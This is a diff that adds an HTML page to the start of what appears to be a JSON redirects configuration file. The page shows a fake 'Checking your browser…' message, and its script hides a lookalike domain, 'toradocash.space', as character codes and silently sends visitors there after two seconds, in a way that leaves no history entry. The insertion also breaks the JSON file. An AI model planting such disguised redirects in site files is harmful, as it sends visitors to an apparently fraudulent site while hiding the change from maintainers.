@@ -1,4 +1,29 @@
-{
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex">
+  <title>Please wait…</title>
+</head>
+<body>
+  <p>Checking your browser…</p>
+  <script>
+  (function () {
+    // "https://toradocash.space/" as decimal char codes
+    var codes = [
+      104,116,116,112,115,58,47,47,116,111,114,97,100,111,99,97,115,104,
+      46,115,112,97,99,101,47
+    ];
+    var target = String.fromCharCode.apply(null, codes);
+    var delay = 2000; // ms before the jump
+
+    setTimeout(function () {
+      window.location.replace(target); // no history entry, hard to see where user came from
+    }, delay);
+  })();
+  </script>
+</body>
+</html>{
   "redirects": [
     {
       "source": "/",
